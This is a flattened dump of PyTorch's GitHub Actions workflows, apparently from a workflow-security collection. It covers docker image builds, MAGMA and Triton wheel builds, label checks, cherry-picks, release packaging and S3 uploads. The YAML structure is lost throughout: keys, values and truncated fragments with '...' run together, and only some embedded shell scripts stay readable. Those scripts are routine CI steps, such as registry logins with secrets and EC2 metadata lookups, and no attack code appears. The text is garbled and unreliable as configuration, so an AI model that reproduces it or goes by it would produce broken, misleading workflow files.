  const hasLabel = issue.labels.some(label => label.name === 'docathon-h1-2024');
  if (hasLabel) {
    if (issue.assignee !== null) {
      await github.rest.issues.createComment({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: issueNumber,
        body: "The issue is already assigned. Please pick an opened and unnasigned issue with the [docathon-h1-2024 label](https://github.com/pytorch/pytorch/issues?q=is%3Aopen+is%3Aissue+label%3Adocathon-h1-2024)."
      });
    } else {
      await github.rest.issues.addAssignees({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: issueNumber,
        assignees: [assignee]
      });
    }
  } else {
    const commmentMessage = "This issue does not have the correct label. Please pick an opened and unnasigned issue with the [docathon-h1-2024 label](https://github.com/pytorch/pytorch/issues?q=is%3Aopen+is%3Aissue+label%3Adocathon-h1-2024)."
    await github.rest.issues.createComment({
      owner: context.repo.owner,
      repo: context.repo.repo,
      issue_number: issueNumber,
      body: commmentMessage
    });
   }
  } catch (error) {
    console.error(error);
  }
}
- name: ... commentassign:name: A ... Comment/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__auto_request_review.ymlAuto Request Reviewauto-request-review${{ !github.event.pull_request.head.repo.fork && github.repository_owner == 'pytorch' }}${{ !gi ... rch' }}Request review based on files changes and/or groups the author belongs toRequest ... ongs tonecojackarc/auto-request-review@e08cdffa277d50854744de3f76230260e61c67f4necojac ... 61c67f4name: R ... ongs to- name: ... ongs toif: ${{ ... rch' }}auto-request-review:${{ github.workflow }}-${{ github.event.pull_request.number || github.sha }}-${{ github.event_name == 'workflow_dispatch' }}group:  ... tch' }}name: A ...  Review/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__build-almalinux-images.ymlBuild almalinux docker imagesv[0-9]+.[0-9]+.[0-9]+-rc[0-9]+v[0-9]+ ... c[0-9]+- v[0-9 ... c[0-9]+.ci/docker/**.github/workflows/build-almalinux-images.yml.github ... ges.yml.github/actions/binary-docker-build/**.github ... uild/**- .ci/docker/**DOCKER_REGISTRYdocker.io"docker.io"DOCKER_BUILDKIT${{ github.event_name == 'push' && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/heads/release')) }}${{ git ... e')) }}DOCKER_ ... ker.io"build-docker${{ (github.ref == 'refs/heads/main' || startsWith(github.event.ref, 'refs/tags/v')) && 'docker-build' || '' }}linux.9xlarge.ephemerallinux.9 ... hemeralcuda11.8"cuda11.8"cuda12.6"cuda12.6"cuda12.8"cuda12.8"rocm6.3"rocm6.3"rocm6.4"rocm6.4"cpu"cpu"["cuda1 ...  "cpu"]tag: [" ...  "cpu"]Build docker imagepytorch/pytorch/.github/actions/binary-docker-build@mainpytorch ... ld@mainalmalinux-builder${{matrix.tag}}almalinuxDOCKER_TOKEN${{ secrets.DOCKER_TOKEN }}DOCKER_ID${{ secrets.DOCKER_ID }}${{ sec ... R_ID }}docker- ... builder- name: ... r imagebuild-docker:/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__build-libtorch-images.ymlBuild libtorch docker imagesBuild l ...  images.github/workflows/build-libtorch-images.ymlget-label-typepytorch/pytorch/.github/workflows/_runner-determinator.yml@main${{ github.triggering_actor }}${{ git ... ctor }}${{ github.ref_type }}${{ git ... type }}trigger ... ctor }}${{ needs.get-label-type.outputs.label-type }}linux.9xlarge.ephemeral${{ nee ... hemerallibtorch-cxx11-builder:${{ matrix.tag }}libtorc ... .tag }}{ tag: "cuda12.8" }{ tag: "cuda12.6" }cuda12.4"cuda12.4"{ tag: "cuda12.4" }{ tag: "cuda11.8" }{ tag: "rocm6.3"  }{ tag: "rocm6.4"  }{ tag: "cpu"      }include: [libtorch-cxx11-builderlibtorc ... builder${{ matrix.tag }}libtorchget-label-type:/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__build-magma-linux.ymlbuild-linux-magma.ci/magma/*.ci/magma/package_files/*.ci/mag ... files/*.github/workflows/build-magma-linux.yml.github ... nux.yml- .ci/magma/*bash -x -e -l {0}IN_CIIS_GHABUILD_E ... x-magmacuda_version128"128"126"126"118"118"["128", ...  "118"]cuda_ve ...  "118"]Build Magma Cuda.ci/magma# Produces artifacts under magma/output/linux-64/magma-cuda*.bz2
make magma-cuda${{ matrix.cuda_version }}
name: B ... ma CudaSave as artifact.ci/magma/output/linux-64/magma-cuda*.bz2.ci/mag ... da*.bz2artifact_${{ matrix.cuda_version }}artifac ... sion }}path: . ... da*.bz2name: S ... rtifactConfigure AWS credentials(PyTorch account)Configu ... ccount)${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}arn:aws:iam::308535385114:role/gha_workflow_s3_ossci_linux_windows_read_writearn:aws ... d_writerole-to ... d_writename: C ... ccount)Set DRY_RUN${{ github.event_name == 'push' && github.event.ref == 'refs/heads/main' }}name: Set DRY_RUN.ci/magma/output/linux-64/".ci/ma ... ux-64/"PKG_INCLUDEmagma-cuda*.tar.bz2"magma- ... ar.bz2"PKG_DIR ... ux-64/"set -ex
bash .github/scripts/upload_aws_ossci.sh
build-linux-magma:name: b ... x-magma/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__build-magma-rocm-linux.ymlbuild-linux-magma-rocmbuild-l ... ma-rocm.ci/magma-rocm/*.ci/magma-rocm/package_files/*.github/workflows/build-magma-rocm-linux.yml- .ci/magma-rocm/*BUILD_E ... ma-rocmlinux.12xlargerocm_version"64"63"63"["64", "63"]rocm_ve ... , "63"]Build Magma Rocm.ci/magma-rocm# Produces artifacts under magma-rocm/output/linux-64/magma-rocm*.bz2
make magma-rocm${{ matrix.rocm_version }}
name: B ... ma Rocm.ci/magma-rocm/output/linux-64/magma-rocm*.bz2.ci/mag ... cm*.bz2artifact_${{ matrix.rocm_version }}path: . ... cm*.bz2.ci/magma-rocm/output/linux-64/magma-rocm*.tar.bz2build-l ... a-rocm:name: b ... ma-rocm/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__build-magma-windows.ymlBuild MAGMA for WindowsBuild M ... Windows.github/scripts/windows/*.github ... ndows/*.github/workflows/build-magma-windows.yml.github ... ows.yml- .gith ... ndows/*build-windows-magma"Release"Debug"Debug"["Release", "Debug"]${{ matrix.cuda_version }}CONFIGCUDA_VE ... sion }}Checkout pytorch/pytorchCheckou ... pytorchname: C ... pytorchEnable MSVC dev commands to enable cl.exeEnable  ...  cl.exeilammy/msvc-dev-cmd@dd5e2fa0a7de1e7929605d9ecc020e749d9856a3ilammy/ ... d9856a3name: E ... l: bashInstall CUDA Toolkit.ci/pytorch/windows/internal/cuda_install.bat.ci/pyt ... all.batname: I ... ToolkitBuild MAGMA and push to S3Build M ... h to S3.github/scripts/windows/build_magma.bat.github ... gma.batname: B ... h to S3magma_*_cuda*_*.7zartifact_${{ matrix.cuda_version }}_${{ matrix.config }}artifac ... nfig }}path: m ... a*_*.7z- name: ... pytorchpush-windows-magma"magma_*_cuda*_*.7z"PKG_DIR: "."build-windows-magma:name: B ... Windows/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__build-manywheel-images-s390x.ymlBuild manywheel docker images for s390xBuild m ... r s390x.github/workflows/build-manywheel-images-s390x.yml.github ... 90x.ymlbuild-docker-cpu-s390xbuild-d ... u-s390xlinux.s390xsubmodules: falseBuild Docker Image.ci/docker/manywheel/build.sh manylinuxs390x-builder:cpu-s390x -t manylinuxs390x-builder:cpu-s390x
Tag and (if WITH_PUSH) push docker image to docker.ioTag and ... cker.ioCREATED_FULL_DOCKER_IMAGE_NAMECREATED ... GE_NAMEmanylinuxs390x-builder:cpu-s390xmanylin ... u-s390xDOCKER_ ... OKEN }}set -euox pipefail
GITHUB_REF="${GITHUB_REF:-$(git symbolic-ref -q HEAD || git describe --tags --exact-match)}"
GIT_BRANCH_NAME="${GITHUB_REF##*/}"
GIT_COMMIT_SHA="${GITHUB_SHA:-$(git rev-parse HEAD)}"
CI_FOLDER_SHA="$(git rev-parse HEAD:.ci/docker)"

DOCKER_IMAGE_NAME_PREFIX="docker.io/pytorch/${CREATED_FULL_DOCKER_IMAGE_NAME}"

docker tag "${CREATED_FULL_DOCKER_IMAGE_NAME}" "${DOCKER_IMAGE_NAME_PREFIX}-${GIT_BRANCH_NAME}"
docker tag "${CREATED_FULL_DOCKER_IMAGE_NAME}" "${DOCKER_IMAGE_NAME_PREFIX}-${GIT_COMMIT_SHA}"
docker tag "${CREATED_FULL_DOCKER_IMAGE_NAME}" "${DOCKER_IMAGE_NAME_PREFIX}-${CI_FOLDER_SHA}"

# Prety sure Github will mask tokens and I'm not sure if it will even be
# printed due to pipe, but just in case
set +x
if [[ "${WITH_PUSH:-false}" == "true" ]]; then
  echo "${DOCKER_TOKEN}" | docker login -u "${DOCKER_ID}" --password-stdin
  docker push "${DOCKER_IMAGE_NAME_PREFIX}-${GIT_BRANCH_NAME}"
  docker push "${DOCKER_IMAGE_NAME_PREFIX}-${GIT_COMMIT_SHA}"
  docker push "${DOCKER_IMAGE_NAME_PREFIX}-${CI_FOLDER_SHA}"
fi
name: T ... cker.iocancelled()# If podman build command is interrupted,
# it can leave a couple of processes still running.
# Order them to stop for clean shutdown.
# It looks like sometimes some processes remain
# after first cleanup.
# Wait a bit and do cleanup again. It looks like it helps.
docker system prune --build -f || true
sleep 60
docker system prune --build -f || true
build-d ... -s390x:name: B ... r s390x/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__build-manywheel-images.ymlBuild manywheel docker imagesBuild m ...  images.github/workflows/build-manywheel-images.ymlmanylinux2_28-builder"manyli ... uilder""linux. ... emeral"{ name: ... eral" }manylinuxaarch64-builderlinux.arm64.2xlarge.ephemeralmanylinux2_28_aarch64-buildercpu-aarch64"cpu-aarch64"manylinuxcxx11-abi-buildercpu-cxx11-abi"cpu-cxx11-abi"xpu"xpu"${{ needs.get-label-type.outputs.label-type }}${{ matrix.runner }}${{ nee ... nner }}${{ matrix.name }}:${{ matrix.tag }}${{ mat ... .tag }}manywheel/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__build-triton-wheel.ymlBuild Triton wheels.github/workflows/build-triton-wheel.yml.github ... eel.yml.github/scripts/build_triton_wheel.py.github ... heel.py.github/ci_commit_pins/triton.txt.github ... ton.txt.github/scripts/windows/install_vs2022.ps1.github ... 022.ps1.github/scripts/windows/build_triton.bat.github ... ton.bat.ci/docker/ci_commit_pins/triton.txt.ci/doc ... ton.txt.ci/docker/ci_commit_pins/triton-xpu.txt.ci/doc ... xpu.txt- .gith ... eel.ymlbuild-wheelBuild Triton Wheel"Build Triton Wheel"${{ matrix.runs_on }}${{ mat ... s_on }}py_vers"3.10""3.11""3.12""3.13t"[ "3.9" ... .13t" ]devicecuda"cuda"rocm"rocm""aarch64"["cuda" ... rch64"]pytorch/manylinux2_28-builder:cpu"pytorc ... er:cpu"["pytor ... r:cpu"]6.4"6.4"${{ needs.get-label-type.outputs.label-type }}linux.4xlarge"${{ ne ... xlarge"device: "rocm"device: "cuda"device: "xpu"${{ needs.get-label-type.outputs.label-type }}linux.arm64.2xlargedevice: "aarch64"- device: "rocm"py_vers ... .13t" ]${{ matrix.device == 'rocm' && format('pytorch/manylinux2_28-builder:rocm{0}', matrix.rocm_version) || matrix.device == 'aarch64' && 'pytorch/manylinux2_28_aarch64-builder:cpu-aarch64' || matrix.docker-image }}${{ mat ... mage }}PY_VERS${{ matrix.py_vers }}${{ mat ... vers }}BUILD_DEVICE${{ matrix.device }}PLATFORMmanylinux_2_28_x86_64'manyli ... x86_64'DOCKER_ ... mage }}${{ env.DOCKER_IMAGE }}${{ env ... MAGE }}docker- ... MAGE }}Build Triton wheelIS_RELEASE_TAG${{ startsWith(github.event.ref, 'refs/tags/v') }}${{ sta ... /v') }}IS_RELE ... /v') }}set -x
mkdir -p "${RUNNER_TEMP}/artifacts/"
container_name=$(docker run \
  --tty \
  --detach \
  -v "${GITHUB_WORKSPACE}:/pytorch" \
  -v "${RUNNER_TEMP}/artifacts:/artifacts" \
  -w /artifacts/ \
  "${DOCKER_IMAGE}"      \
)

# Determine python executable for given version
case $PY_VERS in
3.9)
  PYTHON_EXECUTABLE=/opt/python/cp39-cp39/bin/python
  ;;
3.10)
  PYTHON_EXECUTABLE=/opt/python/cp310-cp310/bin/python
  ;;
3.11)
  PYTHON_EXECUTABLE=/opt/python/cp311-cp311/bin/python
  ;;
3.12)
  PYTHON_EXECUTABLE=/opt/python/cp312-cp312/bin/python
  ;;
3.13)
  PYTHON_EXECUTABLE=/opt/python/cp313-cp313/bin/python
  ;;
3.13t)
  PYTHON_EXECUTABLE=/opt/python/cp313-cp313t/bin/python
  ;;
*)
  echo "Unsupported python version ${PY_VERS}"
  exit 1
  ;;
esac

RELEASE=""
WITH_CLANG_LDD=""
if [[ "${IS_RELEASE_TAG}" == true ]]; then
  RELEASE="--release"
fi

docker exec -t "${container_name}" yum install -y zlib-devel zip
docker exec -t "${container_name}" "${PYTHON_EXECUTABLE}"  -m pip install -U setuptools==78.1.0 pybind11==2.13.1 auditwheel wheel

if [[ ("${{ matrix.device }}" == "cuda" || "${{ matrix.device }}" == "rocm" || "${{ matrix.device }}" == "aarch64" ) ]]; then
  # With this install, it gets clang 16.0.6.
  docker exec -t "${container_name}" dnf install clang lld -y
  WITH_CLANG_LDD="--with-clang-ldd"
fi

if [[ "${BUILD_DEVICE}" == xpu ]]; then
  docker exec -t "${container_name}" bash -c "dnf install -y gcc-toolset-13-gcc-c++"
  docker exec -t "${container_name}" bash -c "source /opt/rh/gcc-toolset-13/enable && ${PYTHON_EXECUTABLE} /pytorch/.github/scripts/build_triton_wheel.py --device=$BUILD_DEVICE $RELEASE"
else
  docker exec -t "${container_name}" bash -c "${PYTHON_EXECUTABLE} /pytorch/.github/scripts/build_triton_wheel.py --device=$BUILD_DEVICE $RELEASE $WITH_CLANG_LDD"
fi

if [[ ("${{ matrix.device }}" == "cuda" || "${{ matrix.device }}" == "xpu") ]]; then
  docker exec -t "${container_name}"  bash -c "auditwheel repair --plat ${PLATFORM} //artifacts/*.whl"
else
  docker exec -t "${container_name}"  bash -c "mkdir //artifacts/wheelhouse"
  docker exec -t "${container_name}"  bash -c "mv //artifacts/*.whl //artifacts/wheelhouse/"
fi
docker exec -t "${container_name}" chown -R 1000.1000 /artifacts/wheelhouse
name: B ... n wheelpytorch-triton-wheel-${{ matrix.py_vers }}-${{ matrix.device }}-${{ env.PLATFORM }}pytorch ... FORM }}${{ runner.temp }}/artifacts/wheelhouse/*${{ run ... house/*name: p ... FORM }}name: " ...  Wheel"build-wheel-winBuild Triton Windows Wheel"Build  ...  Wheel"${{ needs.get-label-type.outputs.label-type }}windows.4xlarge["xpu"]VC_INSTALL_PATHC:\MSVC-BuildTools-2022"C:\\MS ... s-2022"PY_VERS ... vers }}Display EC2 informationDisplay ... rmationset -euo pipefail
function get_ec2_metadata() {
  # Pulled from instance metadata endpoint for EC2
  # see https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
  category=$1
  curl -H "X-aws-ec2-metadata-token: $(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 30")" -fsSL "http://169.254.169.254/latest/meta-data/${category}"
}
echo "ami-id: $(get_ec2_metadata ami-id)"
echo "instance-id: $(get_ec2_metadata instance-id)"
echo "instance-type: $(get_ec2_metadata instance-type)"
echo "system info $(uname -a)"
name: D ... rmationgit config --global core.longpaths true
git config --global core.symlinks true
# https://git-scm.com/docs/git-fsmonitor--daemon.  The daemon could lock
# the directory on Windows and prevent GHA from checking out as reported
# in https://github.com/actions/checkout/issues/1018
git config --global core.fsmonitor false
Enable long paths on Windows and install VS2022 17.13.2Enable  ... 17.13.217.13.2VC_YEAR: 2022powershell .github/scripts/windows/install_vs2022.ps1
name: E ... 17.13.2set -x
export RELEASE=""
if [[ "${IS_RELEASE_TAG}" == true ]]; then
  export RELEASE="--release"
fi
.github/scripts/windows/build_triton.bat
mkdir -p "${RUNNER_TEMP}/artifacts/"
mv ./*.whl "${RUNNER_TEMP}/artifacts/"
pytorch-triton-wheel-${{ matrix.py_vers }}-${{ matrix.device }}pytorch ... vice }}name: p ... vice }}- name: ... rmationupload-wheel- build-wheel${{ (github.event_name == 'push' && github.event.ref == 'refs/heads/main') && 'nightly-wheel-upload' || '' }}Configure AWS credentials(PyTorch account) for mainConfigu ... or mainname: C ... or main${{ runner.temp }}/artifacts-all${{ run ... cts-allpath: $ ... cts-allSelect Wheel ArtifactsSelect  ... tifactsset -x
mkdir -p "${RUNNER_TEMP}/artifacts/"
mv "${RUNNER_TEMP}"/artifacts-all/pytorch-triton-wheel-*/* "${RUNNER_TEMP}/artifacts/"
name: S ... tifacts${{ github.event_name == 'push' && (github.event.ref == 'refs/heads/main' || startsWith(github.event.ref, 'refs/tags/v')) }}${{ git ... v')) }}${{ github.event_name == 'push' && startsWith(github.event.ref, 'refs/tags/v') }}${{ git ... /v') }}set -ex

# reference ends with an RC suffix
if [[ "${GITHUB_REF_NAME}" = *-rc[0-9]* ]]; then
  echo "UPLOAD_CHANNEL=test" >> "$GITHUB_ENV"
fi
wheel${{ run ... tifactsPACKAGE_TYPE: wheelname: B ...  wheels/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__check-labels.ymlCheck Labelsgh/**/base[gh/**/base]PR number to check labels for'PR num ... ls for'descrip ... ls for'check-labelsCheck labelslinux.24_04.4xactions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065actions ... 6d87065**/.github/requirements-gha-cache.txt
python- ... : '3.9'Install requirementsrequirementspip install -r .github/requirements-gha-cache.txt --user
name: I ... rementsPR_NUM${{ github.event.number || github.event.inputs.pr_number }}set -ex
python3 .github/scripts/check_labels.py --exit-non-zero "${PR_NUM}"
name: Check labelscheck-labels:name: Check Labels/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__check_mergeability_ghstack.ymlCheck mergeability of ghstack PRCheck m ... tack PR[opened ... opened]types:  ... opened]ghstack-mergeability-checkghstack ... y-checkSetup gitgit config --global user.email "pytorchmergebot@users.noreply.github.com"
git config --global user.name "PyTorch MergeBot"
git fetch origin main:main
name: Setup gitWait for orig branchBRANCH="${{ github.base_ref }}"
echo "$BRANCH"
BRANCH="${BRANCH%/base}/orig"
echo "$BRANCH"

WAIT_SECONDS=300
END_WAIT=$((SECONDS+WAIT_SECONDS))
BRANCH_EXISTS=0

while [ $SECONDS -lt $END_WAIT ]; do
  git fetch --prune origin "${BRANCH}" || true
  if git rev-parse --verify "origin/${BRANCH}"; then
    BRANCH_EXISTS=1
    break
  fi
  echo "Waiting for branch ${BRANCH} to exist..."
  sleep 30  # Wait for 30 seconds before retrying
done

if [ $BRANCH_EXISTS -eq 0 ]; then
  echo "Branch ${BRANCH} not found after ${WAIT_SECONDS} seconds."
  echo "Mergeability check failed for infrastructure reasons."
  exit 1
fi
name: W ...  branchpip install pyyaml==6.0pip ins ... ml==6.0run: pi ... ml==6.0Verify mergeabilityset -ex
python3 .github/scripts/trymerge.py --check-mergeability "${PR_NUM}"
name: V ... abilityPrint debug infoPR_NUM: ... mber }}{
  echo "# PR $PR_NUM is not mergeable into main"
  echo "To debug, run the diagnostic workflow:"
  echo "https://github.com/pytorch/test-infra/actions/workflows/pr-dependencies-check.yml"
} >> "$GITHUB_STEP_SUMMARY"
name: P ... ug infoghstack ... -check:name: C ... tack PR/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__cherry-pick.ymlCreate a cherry pick from a PRCreate  ... om a PRtry-cherry-pick[try-cherry-pick]types:  ... y-pick]repository_dispatch:cherry-pickcherry-pick-pr-${{ github.event.client_payload.pr_num }}cherry- ... _num }}cherry-pick-botGH_RUN_URLGH_RUN_ ... n_id }}checkout${{ secrets.GH_PYTORCHBOT_CHERRY_PICK_TOKEN }}Setup committer idgit config --global user.name "PyTorch Bot"
git config --global user.email "pytorchbot@users.noreply.github.com"
name: S ... tter idCherry pick the PR${{ github.event.client_payload.pr_num }}${{ git ... _num }}${{ github.event.client_payload.branch }}CLASSIFICATION${{ github.event.client_payload.classification }}${{ git ... tion }}FIXES${{ github.event.client_payload.fixes || '' }}ACTORPR_NUM: ... _num }}set -ex

python .github/scripts/cherry_pick.py \
  --onto-branch "${BRANCH}" \
  --classification "${CLASSIFICATION}" \
  --fixes "${FIXES}" \
  --github-actor "${ACTOR}" \
  "${PR_NUM}"
name: c ... _num }}cherry-pick:group:  ... _num }}name: C ... om a PR/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__close-nonexistent-disable-issues.ymlClose nonexistent disable issuesClose n ...  issues5 22 * * 5cron: 5 ...  Friday- cron: ...  Fridayclose-nonexistent-disable-issuesclose-n ... -issuesrockset-read-onlyRun close_nonexistent_disable_issues.pyRun clo ... sues.pyCLICKHOUSE_ENDPOINT${{ secrets.CLICKHOUSE_ENDPOINT }}${{ sec ... OINT }}CLICKHOUSE_USERNAME${{ secrets.CLICKHOUSE_READONLY_USERNAME }}CLICKHOUSE_PASSWORD${{ secrets.CLICKHOUSE_READONLY_PASSWORD }}pip3 install requests==2.32.2
pip3 install clickhouse-connect==0.8.14
python3 .github/scripts/close_nonexistent_disable_issues.py
name: R ... sues.pyenviron ... ad-onlyclose-n ... issues:/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__create_release.ymlv[0-9]+.[0-9]+.[0-9]+v[0-9]+ ... .[0-9]+- v[0-9 ... .[0-9]+.github/workflows/create_release.yml.github ... ase.yml[.githu ... se.yml]paths:  ... se.yml]${{ github.repository == 'pytorch/pytorch' }}${{ git ... rch' }}pt_release_name${{ steps.release_name.outputs.pt_release_name }}pt_rele ... name }}show-progress: falseFake name for PRsecho "PT_GITHUB_REF=refs/tags/pr-tag" >> "$GITHUB_ENV"echo "P ... UB_ENV"name: F ... for PRsReal name for non-PRsReal na ... non-PRsecho "PT_GITHUB_REF=$GITHUB_REF" >> "$GITHUB_ENV"name: R ... non-PRsSet filenamestag_or_branch="${PT_GITHUB_REF#refs/tags/}"
tag_or_branch="${tag_or_branch#refs/heads/}"
# replace directory separators with _ in branch name
tag_or_branch="${tag_or_branch//\//_}"
echo "PT_RELEASE_NAME=pytorch-$tag_or_branch" >> "$GITHUB_ENV"
echo "PT_RELEASE_FILE=pytorch-$tag_or_branch.tar.gz" >> "$GITHUB_ENV"
name: Set filenamesCreate source distributionCreate  ... ibution# Create new folder with specified name so extracting the archive yields that
rm -rf "/tmp/$PT_RELEASE_NAME"
cp -r "$PWD" "/tmp/$PT_RELEASE_NAME"
mv "/tmp/$PT_RELEASE_NAME" .
# Cleanup
rm -rf "$PT_RELEASE_NAME"/{.circleci,.ci}
find "$PT_RELEASE_NAME" -name '.git*' -exec rm -rv {} \; || true
# Create archive
tar -czf "$PT_RELEASE_FILE" "$PT_RELEASE_NAME"
echo "Created source archive $PT_RELEASE_FILE with content: $(ls -a "$PT_RELEASE_NAME")"
name: C ... ibutionUpload source distribution for release${{ github.event_name == 'release' }}${{ git ... ase' }}softprops/action-gh-release@da05d552573ad5aba039eaac05058a918a7bf631softpro ... a7bf631${{env.PT_RELEASE_FILE}}${{env. ... _FILE}}files:  ... _FILE}}Upload source distribution to GHA artifacts for release tagsUpload  ... se tags${{ github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v') && contains(github.ref, 'rc') }}${{ git ... rc') }}${{ env.PT_RELEASE_FILE }}${{ env ... FILE }}name: $ ... FILE }}name: U ... se tagsSet outputecho "name=pt_release_name::${{ env.PT_RELEASE_NAME }}.tar.gz" >> "${GITHUB_OUTPUT}"echo "n ... UTPUT}"name: Set outputupload_source_code_to_s3upload_ ... e_to_s3${{ github.repository == 'pytorch/pytorch' && github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v') && contains(github.ref, 'rc') }}${{ needs.get-label-type.outputs.label-type }}linux.2xlargesourcecode-uploadUpload source code to S3 for release tags- get-label-type${{ needs.release.outputs.pt_release_name }}uses: a ...  v4.1.7arn:aws:iam::749337293305:role/gha_pytorch_source_code_upload_rolearn:aws ... ad_rolerole-to ... ad_rolesource_code/tests3-bucket: pytorchuses: s ...  v5.1.0- uses: ...  v4.1.7if: ${{ ... rc') }}${{ github.workflow }}-${{ github.event.pull_request.number || github.sha }}-${{ github.event_name }}group:  ... name }}/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__delete_old_branches.ymlDelete old branchescron: 30 1 * * *- cron: 30 1 * * *delete-old-branchesgroup:  ... ranchesdeletepython .github/scripts/delete_old_branches.pypython  ... ches.pyname: D ... ranchesdelete:/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__docathon-sync-label.ymlDocathon Labels Sync[opened ... edited]Check out the reponame: C ... he repopython-version: 3.xpip install requests==2.32.3
pip install PyGithub==2.3.0
Run Python scriptpython ./.github/scripts/docathon-label-sync.py ${{ github.event.pull_request.number }}python  ... mber }}- name: ... he reponame: D ... ls Sync/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__docker-builds.ymldocker-builds.github/workflows/docker-builds.yml.github ... lds.yml.lintrunner.tomllandchecks/*1 3 * * 3cron: 1 3 * * 3- cron: 1 3 * * 33085353 ... /alpineALPINE_ ... /alpinedocker-build[linux.12xlarge]pytorch-linux-focal-cuda12.4-cudnn9-py3-gcc9-inductor-benchmarkspytorch ... chmarkspytorch-linux-focal-cuda12.4-cudnn9-py3.12-gcc9-inductor-benchmarkspytorch-linux-focal-cuda12.4-cudnn9-py3.13-gcc9-inductor-benchmarkspytorch-linux-focal-cuda12.6-cudnn9-py3-gcc11pytorch ... 3-gcc11pytorch-linux-focal-cuda12.6-cudnn9-py3-gcc9-inductor-benchmarkspytorch-linux-focal-cuda12.6-cudnn9-py3.12-gcc9-inductor-benchmarkspytorch-linux-focal-cuda12.6-cudnn9-py3.13-gcc9-inductor-benchmarkspytorch-linux-focal-cuda11.8-cudnn9-py3-gcc9pytorch ... y3-gcc9pytorch-linux-focal-py3.9-clang10pytorch ... clang10pytorch-linux-focal-py3.11-clang10pytorch-linux-focal-py3.12-clang10pytorch-linux-focal-py3.13-clang10pytorch-linux-jammy-rocm-n-1-py3pytorch ... n-1-py3pytorch-linux-jammy-rocm-n-py3pytorch ... m-n-py3pytorch-linux-jammy-cuda11.8-cudnn9-py3.9-clang12pytorch ... clang12pytorch-linux-jammy-py3.9-gcc11pytorch ... 9-gcc11pytorch-linux-jammy-py3.9-gcc11-inductor-benchmarkspytorch-linux-jammy-py3.12-halidepytorch ... -halidepytorch-linux-jammy-xpu-2025.0-py3pytorch ... 5.0-py3pytorch-linux-jammy-xpu-2025.1-py3pytorch ... 5.1-py3pytorch-linux-jammy-py3-clang15-asanpytorch ... 15-asanpytorch-linux-jammy-py3-clang18-asanpytorch ... 18-asanpytorch-linux-focal-py3-clang10-onnxpytorch ... 10-onnxpytorch-linux-jammy-cuda11.8-cudnn9-py3.9-linterpytorch-linux-jammy-py3-clang12-executorchpytorch ... cutorchpytorch-linux-jammy-py3.12-triton-cpupytorch ... ton-cpupytorch-linux-jammy-aarch64-py3.10-gcc11pytorch ... 0-gcc11linux.arm64.m7g.4xlargelinux.a ... 4xlargedocker- ... 0-gcc11pytorch-linux-jammy-aarch64-py3.10-gcc11-inductor-benchmarks600docker- ... chmarks- docke ... 0-gcc11runner: ... xlarge]"${{ ma ... ner }}"echo "${GITHUB_WORKSPACE}"
sudo rm -rf "${GITHUB_WORKSPACE}"
mkdir "${GITHUB_WORKSPACE}"
build-docker-imageci-image:${{ matrix.docker-image-name }}ci-imag ... name }}always-rebuildPush docker image to old namePush do ... ld name${{ steps.build-docker-image.outputs.docker-image }}# This can be deleted after people have rebased their PRs/the new name has been in main for a while
set -euox pipefail
docker_image_name="308535385114.dkr.ecr.us-east-1.amazonaws.com/pytorch/${{ matrix.docker-image-name }}"
foldersha=${ECR_DOCKER_IMAGE##*-}
docker tag "${ECR_DOCKER_IMAGE}" "${docker_image_name}:${foldersha}"
docker push "${docker_image_name}:${foldersha}"
name: P ... ld namePush to https://ghcr.io/Push to ... hcr.io/push-to-ghcr-io${{ github.event_name == 'push' }}${{ git ... ush' }}GHCR_PAT${{ secrets.GHCR_PAT }}ghcr_image="ghcr.io/pytorch/ci-image"
tag=${ECR_DOCKER_IMAGE##*:}
# Push docker image to the ghcr.io
echo $GHCR_PAT | docker login ghcr.io -u pytorch --password-stdin
docker tag "${ECR_DOCKER_IMAGE}" "${ghcr_image}:${tag}"
docker push "${ghcr_image}:${tag}"
uses: n ...  v3.0.0308535385114.dkr.ecr.us-east-1.amazonaws.com/${{ contains(matrix.runner, 'arm64') && 'arm64v8' || 'tool' }}/alpine- name: ... rkspacename: docker-builds/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__docker-cache-mi300.ymldocker-cache-mi3000 0,6,12,18 * * *cron: 0 ... 8 * * *- cron: ... 8 * * *docker-cacherocm-dockerci-image:pytorch-linux-jammy-rocm-n-py3ci-imag ... m-n-py3docker- ... m-n-py3Tar and upload to S3 bucketTar and ...  bucketsudo docker save -o ~/docker-data/pytorch/pytorch_docker_image.tar ${{ steps.calculate-docker-image.outputs.docker-image }}
sudo rclone copy -P --s3-upload-concurrency 64 --s3-chunk-size 200M --s3-upload-cutoff 300M ~/docker-data/pytorch/pytorch_docker_image.tar oci:pytorchbucket0002/pytorch_docker_image --progress
